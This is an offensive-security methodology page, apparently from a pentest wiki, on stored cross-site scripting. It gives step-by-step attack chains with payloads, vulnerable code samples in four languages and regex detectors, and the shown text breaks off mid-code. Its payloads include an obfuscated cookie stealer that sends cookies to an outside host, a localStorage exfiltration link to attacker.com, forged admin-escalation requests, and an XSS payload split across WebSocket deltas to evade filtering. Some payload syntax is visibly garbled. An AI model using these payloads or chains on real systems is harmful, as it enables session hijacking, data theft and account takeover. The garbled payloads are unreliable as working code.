# Stored Cross Site Scripting

## Check List

## Methodology

### Black Box

#### [Blind XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss)

{% stepper %}
{% step %}
Set up an HTTP/HTTPS proxy (e.g., Burp Suite) and enable Intercept
{% endstep %}

{% step %}
Open the target support/chat interface and start uploading a file to the chat
{% endstep %}

{% step %}
When the upload request is captured, pause it in the proxy (Intercept)
{% endstep %}

{% step %}
Modify the filename field in the intercepted upload request to the exact string below

```javascript
"><img src=1 onerror="url=String104,116,116,112,115,58,47,47,103,97,116,111,108,111,117,99,111,46,48,48,48,119,101,98,104,111,115,116,97,112,112,46,99,111,109,47,99,115,109,111,110,101,121,47,105,110,100,101,120,46,112,104,112,63,116,111,107,101,110,115,61+encodeURIComponent(document['cookie']);xhttp=&#x20new&#x20XMLHttpRequest();xhttp'GET',url,true;xhttp'send';
```
{% endstep %}

{% step %}
Forward the modified request so the file with the altered filename appears in the chat
{% endstep %}

{% step %}
Open or refresh the support chat page; when the filename containing the payload is rendered, the XSS should trigger
{% endstep %}
{% endstepper %}

***

#### [XSS in Private Messaging](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#common-payloads)

{% stepper %}
{% step %}
Go to another users profile
{% endstep %}

{% step %}
Click private message
{% endstep %}

{% step %}
Type any subject
{% endstep %}

{% step %}
Type the following message `Test<iframe src=javascript:alert(1) width=0 height=0 style=display:none;></iframe>`
{% endstep %}

{% step %}
Send the message
{% endstep %}

{% step %}
View the message (triggers the XSS)
{% endstep %}

{% step %}
Wait for the victim to read the message
{% endstep %}
{% endstepper %}

***

#### [XSS In JSON Parameter](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#common-payloads)

{% stepper %}
{% step %}
Log in and browse the site while keeping Burp Suite active
{% endstep %}

{% step %}
After checking the api requests that contain json parameters, check them
{% endstep %}

{% step %}
After checking once again, you will go to this api that has been created and a request has been made, and intercept the request
{% endstep %}

{% step %}
Inject inside parameters using XSS payloads

{% hint style="info" %}
We can also inject into the ipAddress parameters
{% endhint %}
{% endstep %}

{% step %}
For example, the request below is a real example

```json
{
    "ipAddress": "<svg on onload=(alert)(document.domain)>",
    "callBackURL":"dssdsd"
}
```
{% endstep %}

{% step %}
After sending the request to the server, it may give us an error code 400 in the response, but after sending the request, the payload was injected and the vulnerability occurred
{% endstep %}
{% endstepper %}

***

#### [localStorage Data Exfiltration To An Attacker Server Via XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-wrappers-for-uri)

{% stepper %}
{% step %}
Open Chrome DevTools Press F12, navigate to Sources > Page tab
{% endstep %}

{% step %}
Search JavaScript Files Use Ctrl+F to search for keywords: path:, url:, api/, v1/
{% endstep %}

{% step %}
Identify Hidden Endpoint Locate unlinked POST endpoint like /platform/apps/lighthouse-homepage from fetch() call
{% endstep %}

{% step %}
Test Basic XSS Payload Submit POST request with body: {"userInput": "\<a href="javascript:alert(1)">clickme"}
{% endstep %}

{% step %}
Verify XSS Execution Confirm alert(1) popup proving unsanitized rendering
{% endstep %}

{% step %}
Inspect LocalStorage In DevTools Console, run JSON.stringify(localStorage) to identify sensitive keys
{% endstep %}

{% step %}
Craft Regex Exfiltration Payload , use&#x20;

```html
<a href="javascript:var match=JSON.stringify(localStorage).match(/ZNavIdentity\.userId=[^&]+&currEntityId=[^&]+/);if(match)fetch('https://attacker.com/?data='+encodeURIComponent(match[0]))">Click to "Verify"</a>  
```
{% endstep %}

{% step %}
Submit Stored XSS Payload POST {"userInput": \[above payload]} to store malicious link
{% endstep %}

{% step %}
Monitor Attacker Server Check https://attacker.com for exfiltrated userId and currEntityId from LocalStorage
{% endstep %}

{% step %}
Verify Account Takeover Confirm stolen PII enables full account access and privilege escalation
{% endstep %}
{% endstepper %}

***

### White Box

#### Organization-wide Compromise via Materialized View Hydration Asymmetry

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus intensely on rich-text input fields (e.g., forum posts, ticketing systems, internal wikis) that exhibit delayed rendering of metadata (like link previews, user mentions, or embedded macros)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify a Command Query Responsibility Segregation (CQRS) architecture combined with Event Sourcing
{% endstep %}

{% step %}
Investigate the synchronous Write-API. Observe that when a user submits a rich-text post, the backend meticulously sanitizes the payload using a robust, industry-standard HTML sanitizer (DOMPurify, HtmlSanitizer) before persisting the initial event to the primary data store
{% endstep %}

{% step %}
Analyze the Read-Model projection pipeline. In high-traffic enterprise environments, re-parsing and enriching millions of text posts on every read request destroys database performance
{% endstep %}

{% step %}
Discover the architectural optimization: The enterprise utilizes asynchronous background workers to project the raw event into a "Materialized View" containing pre-rendered HTML, ensuring zero-latency read operations for the frontend
{% endstep %}

{% step %}
Investigate the post-sanitization hydration workers. Locate the specific worker responsible for resolving "User Mentions" (transforming `@johndoe` into a clickable profile link `<a href="/users/123">@johndoe</a>`)
{% endstep %}

{% step %}
Trace the data flow inside the hydration worker. Notice that the worker receives the _already sanitized_ post content from the message broker
{% endstep %}

{% step %}
Identify the hidden trust assumption: The developer assumes that because the post body was strictly sanitized at the ingress boundary, the entire resulting string remains intrinsically safe. Furthermore, the developer implicitly trusts the `DisplayName` or `Username` field fetched from the internal User Repository, assuming identity fields cannot contain executable code
{% endstep %}

{% step %}
Observe the failure mode: The worker uses simple string replacement or regex to inject the user's `DisplayName` directly into the pre-sanitized HTML body, completely bypassing the sanitization phase which occurred upstream
{% endstep %}

{% step %}
Establish the attack chain. Navigate to your user profile settings and modify your `DisplayName` or `Username` to contain a severed HTML attribute payload (e.g., `" onmouseover="fetch('/api/v1/admin/escalate')`)
{% endstep %}

{% step %}
Submit a new post via the Write-API containing a mention of your own account (e.g., `Hello @attacker`)
{% endstep %}

{% step %}
The Write-API sanitizes the text, finding no malicious tags. The background worker picks up the event, queries your malicious `DisplayName`, and injects it into the anchor tag
{% endstep %}

{% step %}
The materialized view is stored in the read database. When an Administrator views the internal ticket or wiki page, the Stored XSS payload executes, silently forging state-changing API requests under the Administrator's session context

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:HydrateMentionsAsync[\s\S]{0,150}?Replace|content\.Replace\s*\(\s*"@[A-Za-z0-9_]+"\s*,[\s\S]{0,120}?(?:displayName|User|Profile)|Regex\.Replace[\s\S]{0,150}?@\w+[\s\S]{0,120}?(?:displayName|FullName|UserName))
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:content\.replaceAll\s*\(\s*"@[A-Za-z0-9_]+"\s*,[\s\S]{0,120}?(?:displayName|user\.getDisplayName|getFullName)|replaceAll[\s\S]{0,150}?@\w+[\s\S]{0,120}?displayName|Pattern\.compile\s*\([\s\S]{0,80}?@\w+)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:preg_replace\s*\(\s*['"]/@\\w\+/['"][\s\S]{0,120}?\$user->displayName|str_replace\s*\([\s\S]{0,120}?@\w+[\s\S]{0,120}?\$user->displayName|preg_replace_callback\s*\([\s\S]{0,150}?displayName)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:content\.replace\s*\(\s*/@\\w\+/g\s*,[\s\S]{0,120}?user\.displayName|content\.replaceAll\s*\(\s*"@[A-Za-z0-9_]+"\s*,[\s\S]{0,120}?displayName|replace\s*\([\s\S]{0,120}?@\w+[\s\S]{0,120}?displayName)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
HydrateMentionsAsync.*Replace|content\.Replace\(.*displayName|Regex\.Replace.*@\w+.*displayName
```
{% endtab %}

{% tab title="Java" %}
```regexp
content\.replaceAll\("@[A-Za-z0-9_]+".*displayName|replaceAll.*@\w+.*displayName
```
{% endtab %}

{% tab title="PHP" %}
```regexp
preg_replace\('/@\\w+/'.*\$user->displayName|str_replace.*@\w+.*\$user->displayName
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
content\.replace\(/@\\w+/g,.*user\.displayName|replaceAll.*displayName
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class MentionHydrationWorker : IEventConsumer<PostCreatedEvent>
{
    private readonly IUserRepository _userRepo;
    private readonly IReadModelRepository _readModelRepo;

    public async Task ConsumeAsync(PostCreatedEvent evt)
    {
        // [1]
        var materializedHtml = evt.SanitizedContent;

        var mentions = Regex.Matches(materializedHtml, @"@(\w+)");
        foreach (Match mention in mentions)
        {
            var username = mention.Groups[1].Value;
            var user = await _userRepo.FindByUsernameAsync(username);
            
            if (user != null)
            {
                // [2]
                // [3]
                var mentionHtml = $"<a href='/profile/{user.Id}' class='mention' data-name='{user.DisplayName}'>@{username}</a>";
                
                // [4]
                materializedHtml = materializedHtml.Replace(mention.Value, mentionHtml);
            }
        }

        await _readModelRepo.UpdateMaterializedViewAsync(evt.PostId, materializedHtml);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Component
public class MentionHydrationWorker {

    @Autowired
    private UserRepository userRepo;
    @Autowired
    private ReadModelRepository readModelRepo;

    @KafkaListener(topics = "post-created-events")
    public void consume(PostCreatedEvent evt) {
        // [1]
        String materializedHtml = evt.getSanitizedContent();
        
        Matcher matcher = Pattern.compile("@(\\w+)").matcher(materializedHtml);
        while (matcher.find()) {
            String username = matcher.group(1);
            User user = userRepo.findByUsername(username);
            
            if (user != null) {
                // [2]
                // [3]
                String mentionHtml = String.format("<a href='/profile/%s' class='mention' data-name='%s'>@%s</a>", 
                                                   user.getId(), user.getDisplayName(), username);
                
                // [4]
                materializedHtml = materializedHtml.replace(matcher.group(0), mentionHtml);
            }
        }
        
        readModelRepo.updateMaterializedView(evt.getPostId(), materializedHtml);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class MentionHydrationWorker implements ShouldQueue
{
    protected $userRepo;
    protected $readModelRepo;

    public function handle(PostCreatedEvent $evt)
    {
        // [1]
        $materializedHtml = $evt->sanitizedContent;

        $materializedHtml = preg_replace_callback('/@(\w+)/', function($matches) {
            $username = $matches[1];
            $user = $this->userRepo->findByUsername($username);
            
            if ($user) {
                // [2]
                // [3]
                // [4]
                return "<a href='/profile/{$user->id}' class='mention' data-name='{$user->displayName}'>@{$username}</a>";
            }
            return $matches[0];
        }, $materializedHtml);

        $this->readModelRepo->updateMaterializedView($evt->postId, $materializedHtml);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class MentionHydrationWorker {
    static async consume(evt) {
        // [1]
        let materializedHtml = evt.sanitizedContent;
        
        const mentionRegex = /@(\w+)/g;
        let match;
        
        while ((match = mentionRegex.exec(materializedHtml)) !== null) {
            let username = match[1];
            let user = await userRepo.findByUsername(username);
            
            if (user) {
                // [2]
                // [3]
                let mentionHtml = `<a href='/profile/${user.id}' class='mention' data-name='${user.displayName}'>@${username}</a>`;
                
                // [4]
                materializedHtml = materializedHtml.replace(match[0], mentionHtml);
            }
        }
        
        await readModelRepo.updateMaterializedView(evt.postId, materializedHtml);
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The asynchronous worker retrieves the `SanitizedContent` from the event bus. It assumes that because the synchronous API applied strict HTML sanitization, the baseline string is permanently safe, \[2] The worker queries the internal User Repository to resolve the mention,\[3] The architecture relies on an implicit trust boundary: internal database fields (like `DisplayName`) are assumed to be safe, plaintext metadata, \[4] The fatal state transformation. The worker constructs a raw HTML string and injects the attacker-controlled `DisplayName` directly into an HTML attribute (`data-name`). By executing this interpolation _after_ the sanitization pipeline has concluded, the worker silently reconstructs an executable XSS payload and commits it to the authoritative read-model, completely neutralizing the ingress security boundary

```http
// 1. Attacker updates their DisplayName to break out of the HTML attribute and inject a payload.
PUT /api/v1/profile HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <attacker-token>
Content-Type: application/json

{"displayName": "Attacker' onmouseover='fetch(\"/api/v1/admin/escalate\",{method:\"POST\"})' "}
```

```http
// 2. Attacker submits a post containing a mention of their own account.
POST /api/v1/posts HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <attacker-token>
Content-Type: application/json

{"content": "Please review this architectural diagram: @attacker"}

// 3. The Write-API sanitizes the text perfectly. The async worker runs, fetches the poisoned DisplayName, 
// and overwrites the materialized view in the database.

// 4. An Administrator loads the ticket dashboard. The Stored XSS executes silently upon mouse hover.
GET /api/v1/views/posts/recent HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <admin-token>
```
{% endstep %}

{% step %}
To ensure highly responsive frontend read operations, the enterprise architected an asynchronous materialized view pipeline. By separating sanitization (executed synchronously at ingress) from hydration (executed asynchronously by background workers), they inadvertently created a time-of-check to time-of-use (TOCTOU) vulnerability in the rendering pipeline. The attacker weaponized a secondary, seemingly benign data field (`DisplayName`) and forced the background worker to inject it into the post-sanitization HTML context. When the Administrator views the dashboard, the pre-rendered HTML contains the attacker's severed attribute payload, resulting in immediate administrative session hijacking
{% endstep %}
{% endstepper %}

***

#### Administrative Takeover via CRDT Delta Fragmentation in Collaborative Workspaces

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Isolate any features supporting real-time collaborative editing (e.g., shared architecture boards, live document editing, multi-user spreadsheets)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the state synchronization architecture. To minimize bandwidth and prevent merge conflicts, collaborative applications do not transmit full HTML documents over WebSockets. Instead, they transmit granular Operational Transforms (OT) or Conflict-free Replicated Data Type (CRDT) operations (e.g., `{"retain": 5, "insert": "a"}`)
{% endstep %}

{% step %}
Analyze the backend WebSocket hub or synchronization controller. Observe how incoming Delta operations are processed and stored
{% endstep %}

{% step %}
Investigate the backend security boundary. Running a full headless browser DOM and executing a library like DOMPurify on the server for every single 10-millisecond keystroke Delta would instantly exhaust server CPU capacity
{% endstep %}

{% step %}
Discover the engineering optimization: The backend abandons semantic HTML sanitization. Instead, it relies strictly on structural JSON schema validation (ensuring the payload matches the Delta schema) and delegates actual HTML sanitization entirely to the frontend SPA during the initial document load
{% endstep %}

{% step %}
Evaluate the frontend rendering lifecycle. When a user first opens the document, the frontend compiles the historical Deltas into a full HTML string, passes it through DOMPurify, and mounts it to the DOM
{% endstep %}

{% step %}
However, scrutinize the _active streaming_ lifecycle. When a live Delta arrives over the WebSocket _after_ the document has loaded, the frontend cannot afford to re-sanitize and re-render the entire document (which would destroy the user's cursor position). It optimizes the update by applying the Delta directly via native DOM mutation APIs
{% endstep %}

{% step %}
Formulate the fragmentation hypothesis: A Web Application Firewall (WAF) or backend regex filter might block a contiguous payload like `<img src=x onerror=alert(1)>`. However, if the payload is fragmented across multiple independent Delta operations, the backend sees only harmless string fragments
{% endstep %}

{% step %}
Write a script to interface with the collaborative WebSocket endpoint
{% endstep %}

{% step %}
Fragment a catastrophic XSS payload across multiple discrete `insert` operations, delaying each transmission by a few milliseconds
{% endstep %}

{% step %}
The backend receives the fragments, validates their JSON structure, finds no contiguous malicious signatures, and writes them sequentially to the distributed event store
{% endstep %}

{% step %}
Wait for a highly privileged user to join the active collaborative session, or trick them into opening the document
{% endstep %}

{% step %}
If the victim joins a live session, the frontend receives the incoming fragmented Deltas and incrementally mutates the DOM, seamlessly bypassing both the transit WAF and the initial-load sanitizer, executing the Stored XSS in real-time

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:await\s+eventStore\.AppendToStreamAsync\s*\(\s*\w+\s*,\s*delta\s*\)|eventStore\.AppendToStreamAsync[\s\S]{0,150}?(?:delta|operation)|deltaRepository\.Save\s*\(\s*delta\s*\)|document\.(?:Operations|Changes|Deltas)\.(?:Add|AddRange|Push)\s*\(\s*delta\s*\))
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:eventStore\.appendToStream\s*\([\s\S]{0,120}?delta|deltaRepository\.save\s*\(\s*delta\s*\)|document\.getOperations\(\)\.add\s*\(\s*delta\s*\)|eventRepository\.save\s*\([\s\S]{0,120}?delta)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:Redis::rpush\s*\(\s*["']document:.*delta["']|Redis::lPush\s*\(\s*["']document:.*delta["']|deltaRepository->save\s*\(\s*\$delta\s*\)|\$document->operations\[\]\s*=\s*\$delta)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:document\.operations\.push\s*\(\s*delta\s*\)|eventStore\.appendToStream\s*\([\s\S]{0,120}?delta|redis\.(?:rPush|lPush)\s*\([\s\S]{0,120}?delta|operations\.push\s*\(\s*delta\s*\))
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
eventStore\.AppendToStreamAsync\(.*delta|deltaRepository\.Save\(delta\)|Operations\.(Add|Push)\(delta\)
```
{% endtab %}

{% tab title="Java" %}
```regexp
eventStore\.appendToStream\(.*delta|deltaRepository\.save\(delta\)|getOperations\(\)\.add\(delta\)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
Redis::rpush\("document:.*delta|Redis::lPush\("document:.*delta|deltaRepository->save\(\$delta\)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
document\.operations\.push\(delta\)|eventStore\.appendToStream\(.*delta|redis\.(rPush|lPush)\(.*delta
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class CollaborativeEditingHub : Hub
{
    private readonly IDocumentEventStore _eventStore;

    // [1]
    public async Task SubmitDelta(string documentId, DeltaOperation delta)
    {
        // [2]
        if (!IsValidSchema(delta)) 
        {
            throw new HubException("Invalid Delta Schema");
        }

        // [3]
        // [4]
        await _eventStore.AppendToStreamAsync(documentId, delta);

        await Clients.OthersInGroup(documentId).SendAsync("ReceiveLiveDelta", delta);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Component
public class CollaborativeEditingHandler extends TextWebSocketHandler {

    @Autowired
    private DocumentEventStore eventStore;
    @Autowired
    private ObjectMapper objectMapper;

    @Override
    protected void handleTextMessage(WebSocketSession session, TextMessage message) throws Exception {
        // [1]
        DeltaOperation delta = objectMapper.readValue(message.getPayload(), DeltaOperation.class);
        String documentId = extractDocumentId(session);

        // [2]
        if (!isValidSchema(delta)) {
            session.close(CloseStatus.BAD_DATA);
            return;
        }

        // [3]
        // [4]
        eventStore.appendToStream(documentId, delta);

        broadcastToOthers(documentId, session.getId(), delta);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class CollaborativeEditingHandler implements MessageComponentInterface
{
    protected $eventStore;

    public function onMessage(ConnectionInterface $from, $msg)
    {
        // [1]
        $delta = json_decode($msg, true);
        $documentId = $this->extractDocumentId($from);

        // [2]
        if (!$this->isValidSchema($delta)) 
        {
            $from->close();
            return;
        }

        // [3]
        // [4]
        $this->eventStore->appendToStream($documentId, $delta);

        $this->broadcastToOthers($documentId, $from, $delta);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
io.on('connection', (socket) => {
    socket.on('submitDelta', async (documentId, delta) => {
        // [1]
        // [2]
        if (!isValidSchema(delta)) {
            return socket.emit('error', 'Invalid Delta Schema');
        }

        // [3]
        // [4]
        await eventStore.appendToStream(documentId, delta);

        socket.to(documentId).emit('receiveLiveDelta', delta);
    });
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The real-time synchronization hub receives highly granular, localized state changes (Deltas) from the client's rich text editor, \[2] The backend enforces structural integrity using strict JSON schema validation, ensuring the payload conforms to the CRDT operational standard (e.g., specific `insert`, `retain`, and `delete` key-value pairs), \[3] The architecture delegates semantic HTML sanitization entirely to the client-side SPA. Evaluating complex DOM trees on the backend for every individual keystroke is computationally unviable for enterprise real-time collaboration, \[4] The backend blindly appends the fragments to the persistent Event Store. By failing to maintain and continuously re-sanitize a synchronized, contiguous server-side state buffer, the architecture allows an attacker to chronologically fragment a catastrophic XSS payload, rendering all ingress WAFs and edge security controls mathematically blind to the attack

```http
// 1. Attacker opens a WebSocket connection to the collaborative document.
// 2. Attacker sequentially sends the fragmented XSS payload via CRDT Deltas.

// [WebSocket Send]
{"documentId": "doc-123", "delta": {"retain": 10, "insert": "<im"}}

// [WebSocket Send]
{"documentId": "doc-123", "delta": {"retain": 13, "insert": "g sr"}}

// [WebSocket Send]
{"documentId": "doc-123", "delta": {"retain": 17, "insert": "c=x onerro"}}

// [WebSocket Send]
{"documentId": "doc-123", "delta": {"retain": 27, "insert": "r=alert(document.cookie)>"}}

// 3. The Administrator opens the document.
// 4. The frontend SPA requests the historical delta stream.
// 5. The frontend incrementally applies the operations, reconstructing the DOM element:
// <img src=x onerror=alert(document.cookie)>
// 6. The browser immediately executes the reconstructed payload.
```
{% endstep %}

{% step %}
To support ultra-low-latency collaborative editing, the enterprise optimized its architecture by transmitting and storing granular CRDT deltas instead of contiguous HTML blobs. This optimization fundamentally shifted the trust boundary, forcing the backend to rely solely on structural JSON validation while deferring semantic security to the client-side renderer. The attacker bypassed all network-level detection mechanisms by temporally and spatially fragmenting their XSS payload across discrete WebSocket messages. The backend faithfully committed these fragments to the database. When the Administrator joined the session, the frontend synchronization engine seamlessly merged the harmless fragments directly into the live DOM, assembling and detonating the Stored XSS payload entirely on the client side, leading to immediate administrative takeover
{% endstep %}
{% endstepper %}

***

#### Session Compromise via Server-Driven UI (SDUI) Shallow Traversal Validation

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on features that allow users to heavily customize their own workspaces, dashboards, or workflow forms.
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind.
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack.
{% endstep %}

{% step %}
Identify a Server-Driven UI (SDUI) architecture. Instead of hardcoding React/Vue components on the frontend, the backend database stores a deeply nested JSON graph representing the UI layout (e.g., `{"type": "Grid", "children": [{"type": "Button"}]}`). The frontend recursively parses this JSON to render the DOM.
{% endstep %}

{% step %}
Investigate the API endpoint that allows users to save or update their dashboard configuration.
{% endstep %}

{% step %}
Understand the engineering optimization: Malicious users could attempt to inject forbidden UI components (e.g., `HtmlWidget` or `ScriptRunner`) into their JSON configuration. To prevent this, the backend runs a Schema Validator over the incoming JSON tree.
{% endstep %}

{% step %}
Analyze the performance bottleneck: Validating deeply nested, highly complex JSON trees containing tens of thousands of nodes consumes enormous amounts of CPU and stack memory on the backend.
{% endstep %}

{% step %}
Discover the shallow validation shortcut: To protect backend workers from CPU exhaustion and StackOverflow exceptions, the developer implemented a `MAX_DEPTH` threshold on the JSON schema validator (e.g., it only validates up to 10 layers deep).
{% endstep %}

{% step %}
Observe the architectural assumption: The developer assumed that UI configurations deeper than 10 layers are purely structural (e.g., spacing, nested columns) and inherently cannot contain actionable or dangerous widgets. If a node exceeds the depth limit, the validator simply skips it and assumes it is safe.
{% endstep %}

{% step %}
Examine the frontend rendering engine. The frontend SDUI parser (running on the client's powerful local CPU) has no such depth limitations. It will recursively render the entire JSON tree until it hits the bottom.
{% endstep %}

{% step %}
Construct a malicious JSON SDUI configuration. Select a highly dangerous component that the backend schema validator normally blocks (e.g., `{"type": "HtmlWidget", "content": "<img src=x onerror=alert(1)>"}`)
{% endstep %}

{% step %}
Nest this malicious component inside 15 layers of benign structural containers (e.g., `Container -> Row -> Column -> Grid -> ...`).
{% endstep %}

{% step %}
Submit the deeply nested JSON payload to the dashboard save endpoint.
{% endstep %}

{% step %}
The backend schema validator traverses the tree, hits the 10-layer depth limit, aborts further inspection, and persists the poisoned JSON graph to the database.
{% endstep %}

{% step %}
Share the customized dashboard with a target victim. When the victim accesses the workspace, the frontend SDUI engine recursively unpacks all 15 layers, encounters the forbidden `HtmlWidget`, and dynamically mounts the Stored XSS payload into the active DOM.

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:ValidateSchema[\s\S]{0,150}?depth\s*>\s*MAX_DEPTH|if\s*\(\s*depth\s*>=\s*\d+\s*\)\s*return\s*true|traverseAndValidate[\s\S]{0,120}?depth\s*\+\s*1|Validator\.walk[\s\S]{0,120}?depth\s*>\s*limit|Validate(?:Node|Tree|Object)[\s\S]{0,120}?depth|Walk(?:Node|Tree)[\s\S]{0,120}?depth)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:validateSchema[\s\S]{0,150}?depth\s*>\s*MAX_DEPTH|if\s*\(\s*depth\s*>=\s*\d+\s*\)\s*return\s*true|traverseAndValidate[\s\S]{0,120}?depth\s*\+\s*1|validator\.walk[\s\S]{0,120}?depth\s*>\s*limit|walkTree[\s\S]{0,120}?depth|validateNode[\s\S]{0,120}?depth)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:validateSchema[\s\S]{0,150}?depth\s*>\s*MAX_DEPTH|if\s*\(\s*\$depth\s*>=\s*\d+\s*\)\s*return\s*true|traverseAndValidate[\s\S]{0,120}?\$depth\s*\+\s*1|Validator::walk[\s\S]{0,120}?\$depth\s*>\s*\$limit|walkTree[\s\S]{0,120}?\$depth|validateNode[\s\S]{0,120}?\$depth)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:validateSchema[\s\S]{0,150}?depth\s*>\s*MAX_DEPTH|if\s*\(\s*depth\s*>=\s*\d+\s*\)\s*return\s*true|traverseAndValidate[\s\S]{0,120}?depth\s*\+\s*1|validator\.walk[\s\S]{0,120}?depth\s*>\s*limit|walkTree[\s\S]{0,120}?depth|validateNode[\s\S]{0,120}?depth)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
ValidateSchema.*depth\s*>\s*MAX_DEPTH|if\s*\(\s*depth\s*>=\s*\d+\s*\)\s*return\s*true|traverseAndValidate.*depth\s*\+\s*1|Validator\.walk.*depth\s*>\s*limit
```
{% endtab %}

{% tab title="Java" %}
```regexp
validateSchema.*depth\s*>\s*MAX_DEPTH|if\s*\(\s*depth\s*>=\s*\d+\s*\)\s*return\s*true|traverseAndValidate.*depth\s*\+\s*1|validator\.walk.*depth\s*>\s*limit
```
{% endtab %}

{% tab title="PHP" %}
```regexp
validateSchema.*depth\s*>\s*MAX_DEPTH|if\s*\(\s*\$depth\s*>=\s*\d+\s*\)\s*return\s*true|traverseAndValidate.*\$depth\s*\+\s*1|Validator::walk.*\$depth\s*>\s*\$limit
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
validateSchema.*depth\s*>\s*MAX_DEPTH|if\s*\(\s*depth\s*>=\s*\d+\s*\)\s*return\s*true|traverseAndValidate.*depth\s*\+\s*1|validator\.walk.*depth\s*>\s*limit
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class SduiSchemaValidator 
{
    private const int MAX_TRAVERSAL_DEPTH = 10;
    private readonly string[] _forbiddenWidgets = { "HtmlWidget", "ScriptRunner", "IFrame" };

    public bool ValidateConfiguration(JsonElement element, int currentDepth = 0) 
    {
        // [1]
        // [2]
        if (currentDepth >= MAX_TRAVERSAL_DEPTH) 
        {
            return true; 
        }

        if (element.ValueKind == JsonValueKind.Object) 
        {
            // [3]
            if (element.TryGetProperty("type", out var typeProp)) 
            {
                var widgetType = typeProp.GetString();
                if (_forbiddenWidgets.Contains(widgetType)) return false;
            }

            // [4]
            if (element.TryGetProperty("children", out var children)) 
            {
                foreach (var child in children.EnumerateArray()) 
                {
                    if (!ValidateConfiguration(child, currentDepth + 1)) return false;
                }
            }
        }
        
        return true;
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Component
public class SduiSchemaValidator {

    private static final int MAX_TRAVERSAL_DEPTH = 10;
    private static final List<String> FORBIDDEN_WIDGETS = Arrays.asList("HtmlWidget", "ScriptRunner", "IFrame");

    public boolean validateConfiguration(JsonNode node, int currentDepth) {
        // [1]
        // [2]
        if (currentDepth >= MAX_TRAVERSAL_DEPTH) {
            return true;
        }

        if (node.isObject()) {
            // [3]
            if (node.has("type")) {
                String widgetType = node.get("type").asText();
                if (FORBIDDEN_WIDGETS.contains(widgetType)) return false;
            }

            // [4]
            if (node.has("children") && node.get("children").isArray()) {
                for (JsonNode child : node.get("children")) {
                    if (!validateConfiguration(child, currentDepth + 1)) return false;
                }
            }
        }

        return true;
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class SduiSchemaValidator 
{
    const MAX_TRAVERSAL_DEPTH = 10;
    const FORBIDDEN_WIDGETS = ['HtmlWidget', 'ScriptRunner', 'IFrame'];

    public function validateConfiguration(array $node, int $currentDepth = 0): bool 
    {
        // [1]
        // [2]
        if ($currentDepth >= self::MAX_TRAVERSAL_DEPTH) {
            return true;
        }

        // [3]
        if (isset($node['type'])) {
            if (in_array($node['type'], self::FORBIDDEN_WIDGETS)) return false;
        }

        // [4]
        if (isset($node['children']) && is_array($node['children'])) {
            foreach ($node['children'] as $child) {
                if (!$this->validateConfiguration($child, $currentDepth + 1)) return false;
            }
        }

        return true;
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class SduiSchemaValidator {
    static MAX_TRAVERSAL_DEPTH = 10;
    static FORBIDDEN_WIDGETS = ['HtmlWidget', 'ScriptRunner', 'IFrame'];

    static validateConfiguration(node, currentDepth = 0) {
        // [1]
        // [2]
        if (currentDepth >= this.MAX_TRAVERSAL_DEPTH) {
            return true;
        }

        if (typeof node === 'object' && node !== null) {
            // [3]
            if (node.type && this.FORBIDDEN_WIDGETS.includes(node.type)) {
                return false;
            }

            // [4]
